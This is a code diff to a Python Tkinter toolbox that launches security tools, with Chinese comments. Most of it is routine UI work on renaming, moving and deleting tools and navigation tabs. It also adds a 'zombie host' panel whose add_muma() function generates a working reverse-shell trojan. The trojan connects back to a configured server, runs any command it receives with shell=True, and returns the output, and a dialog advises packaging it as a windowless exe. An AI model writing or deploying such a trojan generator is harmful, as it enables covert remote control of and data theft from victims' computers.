@@ -5,7 +5,7 @@ import json
 import os
 import subprocess
 import urllib
-from tkinter import Button, Frame, LEFT, Menu, messagebox, simpledialog
+from tkinter import Button, Frame, LEFT, Menu, messagebox, simpledialog, filedialog
 from urllib.parse import urlparse
 
 ### 一、创建全局变量
@@ -26,6 +26,12 @@ config_env_json_path = "config/env_cofnig.json"
 
 # 6、初始化语言翻译方向
 translation_direction = ("en", "zh")
+
+# 7、服务端配置文件
+config_server_json_path = "config/server_config.json"
+
+# 8、启动窗口大小配置文件
+windowSize_json_path = "config/windowSize.json"
 
 ### 二、拿到用户电脑的屏幕尺寸
 def center_window(win, width, height):
@@ -50,9 +56,12 @@ def on_right_click(frame_canvas,button,tool):
     # 定义菜单项和对应的操作
     context_menu = Menu(button, tearoff=0)
     context_menu.add_command(label="加入首页", command=lambda: join_index(tool))
-    context_menu.add_separator()
     context_menu.add_command(label="打开所在文件夹", command=lambda: open_tools_path(frame_canvas,tool))
+    context_menu.add_separator()
+    context_menu.add_command(label="修改工具名称", command=lambda: edit_tools_name(frame_canvas,tool))
+    context_menu.add_command(label="修改工具路径", command=lambda: edit_tools_path(frame_canvas,tool))
     context_menu.add_command(label="修改启动命令", command=lambda: edit_tools_command(frame_canvas,tool))
+    context_menu.add_separator()
     context_menu.add_command(label="删除工具", command=lambda: delete_tools(frame_canvas,tool))
     context_menu.add_separator()
     context_menu.add_command(label="刷新", command=lambda: reload_tools(frame_canvas,tool))
@@ -80,20 +89,7 @@ def join_index(tool_one):
     else:
         messagebox.showinfo("设置失败！", "该工具已经被设置在首页！")
 
-# 3、更新按钮: 右键加入首页的更新操作
-def update_tools(tool_categorie,tool_info):
-    # 1、获取这个tools文件的路径
-    txt_path = get_menu_path_one(tool_categorie)
-
-    # 2、清空这个tools文件
-    with open(txt_path + "/tools.txt", 'w') as file:
-        pass  # 不需要执行任何操作，直接关闭文件
-
-    # 3、进行tools文件的追加
-    for tool in tool_info:
-        save_tool_txt(txt_path,tool)
-
-# 4、创建按钮。从 TXT 加载工具信息并创建按钮的函数（刷新操作）
+# 4、创建按钮、刷新按钮。从 TXT 加载工具信息并创建按钮的函数（刷新操作）
 def load_tools_and_create_buttons(frame_canvas,tool_categorie,tool_use="首页"):   # 这里的canvas实质是按钮的frame
     global buttons
 
@@ -227,7 +223,41 @@ def download_tools(tool,url,local_filename):
     except Exception as e:
         print(f"下载失败: {e}")
 
-# 7、修改工具，对按钮启动命令进行修改
+# 7、修改工具名称
+def edit_tools_name(frame_canvas,tool):
+    new_tool_name = simpledialog.askstring("修改工具名称", "请输入修改的工具名称: ")
+    if new_tool_name is not None:
+        # 进行 tools.txt 配置文件的保存
+        txt_jsons = get_json_txt_all(get_menu_path_one(tool["工具分类"]))   # 获取txt所有的工具
+
+        # 判断是否重复
+        if any(new_tool_name == txt_json["工具名称"] for txt_json in txt_jsons):
+            messagebox.showinfo("修改失败","该工具名称已存在！")
+        else:   # 工具名称不存在，工具名称唯一
+            # 进行工具名称的修改
+            for txt_json in txt_jsons:
+                if tool["工具名称"] == txt_json["工具名称"]:
+                    txt_json["工具名称"] = new_tool_name
+            # 进行 txt 配置文件的保存
+            update_tools(tool["工具分类"],txt_jsons)
+            # 进入刷新函数
+            load_tools_and_create_buttons(frame_canvas,tool["工具分类"],tool["工具使用"])
+
+# 7、修改工具路径
+def edit_tools_path(frame_canvas,tool):
+    new_tool_path = simpledialog.askstring("修改工具工具", "请输入修改的工具路径: ")
+    if new_tool_path is not None:
+        # 进行 tools.txt 配置文件的保存
+        txt_jsons = get_json_txt_all(get_menu_path_one(tool["工具分类"]))   # 获取txt所有的工具
+        for txt_json in txt_jsons:
+            if tool["工具名称"] == txt_json["工具名称"]:
+                txt_json["工具路径"] = new_tool_path
+        # 进行 txt 配置文件的保存
+        update_tools(tool["工具分类"],txt_jsons)
+        # 进入刷新函数
+        load_tools_and_create_buttons(frame_canvas,tool["工具分类"],tool["工具使用"])
+
+# 7、修改工具启动命令，对按钮启动命令进行修改
 def edit_tools_command(frame_canvas,tool):
     command = simpledialog.askstring("修改启动命令", "可命令行启动(*代替文件名)与直接启动: ")
     if command is not None:
@@ -243,6 +273,7 @@ def edit_tools_command(frame_canvas,tool):
         # 进入刷新函数
         load_tools_and_create_buttons(frame_canvas,tool["工具分类"],tool["工具使用"])
 
+
 # 8、删除工具
 def delete_tools(frame_canvas,tool):
     txt_all = get_json_txt_all(get_menu_path_one(tool["工具分类"]))
@@ -257,6 +288,7 @@ def delete_tools(frame_canvas,tool):
         if messagebox.askyesno("警告！","是否删除相对路径下对应的工具文件？"):
             delete_dir(get_menu_path_one(tool["工具分类"]),tool["工具路径"].split('\\')[0])
             messagebox.showinfo("删除成功！", "该工具及其文件成功被删除！")
+
     # 进行 tools 文件的更新
     update_tools(tool["工具分类"],txt_all)
 
@@ -300,6 +332,116 @@ def create_Navigation_Bar(win,canvas,navigation_bar_names,menu_name):    # 这�
         # 动态创建按钮并添加到导航栏
         button = Button(navigation_bar, text=navigation_bar_name, command=lambda tool_use=navigation_bar_name: load_tools_and_create_buttons(canvas, menu_name, tool_use=tool_use))
         button.pack(side=LEFT, padx=0.05, pady=2)  # 使用 pack 布局管理器
+        show_context_menu(button,menu_name,navigation_bar_name)
+
+# 2、导航栏左侧移动
+def navigation_Bar_Left_Move(menu_name,navigation_bar_name):
+    # 说白了就是重新整改json_config 文件内容
+    # config_json变量存放了目前json_config 文件的整个json内容
+    # 我们应该根据导航栏button 的名字来定位这个导航栏：navigation_bar_name
+    # 导航栏的内容存储在 config/config.json中
+    # 1、先获取当前菜单栏的整个导航栏内容
+    all_navigation_Bar_names = config_json[menu_name]["navigation_bar_name"]
+
+    # 2、循环遍历下标进行替换
+    for i in range(len(all_navigation_Bar_names)):
+        if all_navigation_Bar_names[i] == navigation_bar_name:
+            if i == 0:
+                messagebox.showinfo("警告！","该导航栏按钮已经位于最左侧，不可移动")
+            else:
+                all_navigation_Bar_names[i-1],all_navigation_Bar_names[i] = all_navigation_Bar_names[i],all_navigation_Bar_names[i-1]
+
+    # 3、对全局变量config_json 进行更新
+    config_json[menu_name]["navigation_bar_name"] = all_navigation_Bar_names
+
+    # 4、保存更改设置
+    save_json_all(config_json)
+
+    # 5、移动成功，刷新一波
+
+# 3、导航栏右侧移动
+def navigation_Bar_Right_Move(menu_name,navigation_bar_name):
+    all_navigation_Bar_names = config_json[menu_name]["navigation_bar_name"]
+
+    # 2、循环遍历下标进行替换
+    for i in range(len(all_navigation_Bar_names)-1 ,-1 ,-1):
+        if all_navigation_Bar_names[i] == navigation_bar_name:
+            if i == len(all_navigation_Bar_names)-1:
+                messagebox.showinfo("警告！","该导航栏按钮已经位于最右侧，不可移动")
+            else:
+                all_navigation_Bar_names[i],all_navigation_Bar_names[i+1] = all_navigation_Bar_names[i+1],all_navigation_Bar_names[i]
+
+    # 3、对全局变量config_json 进行更新
+    config_json[menu_name]["navigation_bar_name"] = all_navigation_Bar_names
+
+    # 4、保存更改设置
+    save_json_all(config_json)
+
+    # 5、移动成功，刷新一波
+
+# 4、删除导航栏
+def navigation_Bar_delete(menu_name,navigation_bar_name):
+    all_navigation_Bar_names = config_json[menu_name]["navigation_bar_name"]
+
+    # 2、循环遍历下标进行替换
+    for i in range(len(all_navigation_Bar_names)-1, -1, -1):
+        if all_navigation_Bar_names[i] == navigation_bar_name:
+            del all_navigation_Bar_names[i]
+
+    # 3、对全局变量config_json 进行更新
+    config_json[menu_name]["navigation_bar_name"] = all_navigation_Bar_names
+
+    # 4、保存更改设置
+    save_json_all(config_json)
+
+    # 5、进行刷新
+
+# 5、更改导航栏名称
+def navigation_Bar_Update_name(menu_name,navigation_bar_name):
+    all_navigation_Bar_names = config_json[menu_name]["navigation_bar_name"]
+
+    # 2、循环遍历下标进行替换
+    for i in range(len(all_navigation_Bar_names)):
+        if all_navigation_Bar_names[i] == navigation_bar_name:
+            new_navigation_Bar_name = simpledialog.askstring("修改导航栏名称", "请勿使用空格和特殊字符")
+            if new_navigation_Bar_name is not None:
+                all_navigation_Bar_names[i] = new_navigation_Bar_name
+
+                # 5、对json_txt 配置进行更新
+                # 我们应该获取全txt 之后对json txt 进行全更新
+                txt_all = get_json_txt_all(get_menu_path_one(menu_name))
+                for json_txt_tool in txt_all:
+                    if json_txt_tool["工具使用"] == navigation_bar_name:
+                        json_txt_tool["工具使用"] = new_navigation_Bar_name
+                # 进行 tools 文件的全更新
+                update_tools(menu_name,txt_all)
+
+                # 3、对全局变量config_json 进行更新
+                config_json[menu_name]["navigation_bar_name"] = all_navigation_Bar_names
+
+                # 4、保存更改设置
+                save_json_all(config_json)
+
+                # 进入导航栏的刷新
+
+
+# 6、导航栏右键菜单设置
+def show_context_menu(button,menu_name,navigation_bar_name):
+    # 创建右键菜单
+    # navigation_bar_name 是导航栏的名字，帮助我们很好的定位这个导航栏
+    def show_context_menu(event):
+        context_menu.post(event.x_root, event.y_root)  # 显示菜单
+
+    # 定义菜单项和对应的操作
+    context_menu = Menu(button, tearoff=0)
+    context_menu.add_command(label="左移一格", command=lambda: navigation_Bar_Left_Move(menu_name,navigation_bar_name))
+    context_menu.add_command(label="右移一格", command=lambda: navigation_Bar_Right_Move(menu_name,navigation_bar_name))
+    context_menu.add_command(label="删除导航栏", command=lambda: navigation_Bar_delete(menu_name,navigation_bar_name))
+    context_menu.add_separator()
+    context_menu.add_command(label="更改名称", command=lambda: navigation_Bar_Update_name(menu_name,navigation_bar_name))
+
+    # 绑定右键事件
+    button.bind("<Button-3>", show_context_menu)
 
 ### 五、有关 config_json 文件的操作
 # 获取 json 文件中的所有内容
@@ -373,7 +515,7 @@ def save_tool_txt(txt_path,tool_info):
         json.dump(tool_info, file, ensure_ascii=False)
         file.write('\n')  # 换行分隔每个工具的信息
 
-# 3、获取tool工具的 uses使用
+# 3、根据工具的uses使用 获取同类型工具
 def get_tool_uses(tool_categorie,tool_use):
     tool_uses = []
     tools = get_tools(tool_categorie)   # 本质是获取所有tools.txt 文件内容
@@ -390,7 +532,7 @@ def get_tool_uses(tool_categorie,tool_use):
     return tool_uses
 
 # 4、根据工具类型获取对应目录下tools.txt 文件的所有内容
-def get_tools(tool_categorie):
+def get_tools(tool_categorie):  # 根据 工具的分类（菜单栏名称） 获取tools.txt 下所有的工具
     tools = []
     txt_path = get_menu_path_one(tool_categorie)
     try:
@@ -404,6 +546,19 @@ def get_tools(tool_categorie):
     except FileNotFoundError:
         print(f"[!] 警告！{txt_path}/tools.txt 工具配置信息文件出错")
     return tools
+
+# 5、更新update_json_text_all: 全写入全更新操作：菜单栏和全写入的json_txt 内容
+def update_tools(tool_categorie,tool_info):
+    # 1、获取这个tools文件的路径
+    txt_path = get_menu_path_one(tool_categorie)
+
+    # 2、清空这个tools文件
+    with open(txt_path + "/tools.txt", 'w') as file:
+        pass  # 不需要执行任何操作，直接关闭文件
+
+    # 3、进行tools文件的追加
+    for tool in tool_info:
+        save_tool_txt(txt_path,tool)
 
 ### 七、AI对话模型设置
 # 1、获取 ai_json 文件中的所有内容
@@ -436,12 +591,11 @@ def get_ai_json_name_all():
     return list(config_ai_json.keys())
 
 # 4、修改更新ai的json配置文件
-def update_ai_json(ai_names,ai_api,ai_color):
+def update_ai_json(ai_names,ai_api):
     for ai_name in get_ai_json_name_all():
         if ai_name == ai_names:
             config_ai_json[ai_names]["AI_API"] = ai_api.strip()
-            config_ai_json[ai_names]["ai_color"] = ai_color
-
+            # config_ai_json[ai_names]["ai_color"] = ai_color
     update_ai_all_json(config_ai_json)
 
 # 5、全更改ai的json配置文件
@@ -470,7 +624,98 @@ def get_ai_json_one_api(ai_name):
 def get_ai_json_one_color(ai_name):
     return config_ai_json[ai_name]["ai_color"]
 
-### 八、其他的相关操作
+### 八、启动窗口大小配置
+# 1、保存启动窗口大小配置
+def update_windowSize_json(windowSize_Widths,windowSize_Higths):
+    with open(windowSize_json_path, "w", encoding='utf-8') as f:
+        json.dump({"windowSize_Width": windowSize_Widths, "windowSize_Higths": windowSize_Higths}, f, indent=4)
+
+# 2、读取启动窗口大小配置
+def get_windowSize_json():
+    try:
+        with open(windowSize_json_path, 'r') as json_file:
+            return json.load(json_file)     # 返回json文件所有内容，即一个json对象
+    except Exception:
+        return {}
+
+
+### 九、肉鸡面板的配置
+# 1、增加服务端配置信息（覆盖式增加）
+def save_server_json(json_info):
+    with open(config_server_json_path, 'w') as json_file:
+        json.dump(json_info, json_file, indent=4)  # indent=4 用于格式化输出
+
+# 2、获取服务端配置信息
+def get_server_json():
+    try:
+        with open(config_server_json_path, 'r') as json_file:
+            return json.load(json_file)     # 返回json文件所有内容，即一个json对象
+    except Exception:
+        return {}
+
+# 3、判断配置文件是否为空，若为空放回 False
+def config_server_json_null_check():
+    if len(get_server_json()) == 0 or get_server_json() == {}:
+        return False
+    else:
+        return True
+
+# 4、清空rouji.json 配置文件，方便下次使用
+def delete_server_json():
+    if os.path.isfile(config_server_json_path):
+        os.remove(config_server_json_path)
+
+# 5、增加木马，也就是生成木马操作
+def add_muma():
+    def create_and_save_text_file(content):
+        # 弹出文件保存对话框，让用户选择保存位置和文件名
+        filepath = filedialog.asksaveasfilename(
+            defaultextension=".py",
+            filetypes=[("Python Files", "*.py"), ("All Files", "*.*")]
+        )
+
+        # 如果用户取消了操作，filepath会是空字符串
+        if not filepath:
+            print("文件保存被取消。")
+            return
+
+        # 写入内容到文件
+        with open(filepath, 'w', encoding='utf-8') as file:
+            file.write(content)
+        messagebox.showinfo("生成成功",f"文件已保存到: {filepath}\n1、可以对py木马进行装饰\n2、可以用pyinstaller -F -w xxx.py 打包变成exe")
+
+    if config_server_json_null_check():
+        server_json = get_server_json()
+        listen_IP = server_json["server_ip"]
+        listen_Port = server_json["server_port"]
+
+    else:
+        messagebox.showinfo("错误","请先进行服务端的连接！\n请将工具箱目录下的server.py文件运行在放在双方都可访问的服务器上\n并配置服务端连接")
+        return
+
+    conntext = f"""import socket,subprocess,os
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect(("{listen_IP}", {listen_Port}))
+while True:
+    response = client.recv(4096).decode("UTF-8")
+    print(response)
+    if "exit" == response:
+        break
+    elif "cd" in response:
+        os.chdir(response[3:].strip())
+    try:
+        result = subprocess.check_output(response,stderr=subprocess.STDOUT, shell=True)
+        if result == b'':   # 创建文件等命令的返回值为空
+            client.send("执行成功，结果为空\\r\\n".encode("UTF-8"))
+        else:
+            client.send(result)
+    except:
+        client.send("错误的命令输入！\\r\\n".encode("UTF-8"))
+client.close()"""
+
+    create_and_save_text_file(conntext)
+
+### 九、其他的相关操作
 # 1、判断操作系统。True为windows
 def os_name():
     return os.name == 'nt'
@@ -535,3 +780,9 @@ def is_path(tool):
 
     return path_check(tool["工具路径"])
 
+# 6、判断一个获取的json格式是否为空
+# 如果为空，则返回False，否则有东西返回True
+def check_json_null(jsonInfo):
+    if len(jsonInfo) == 0 or jsonInfo == {}:
+        return False
+    return True
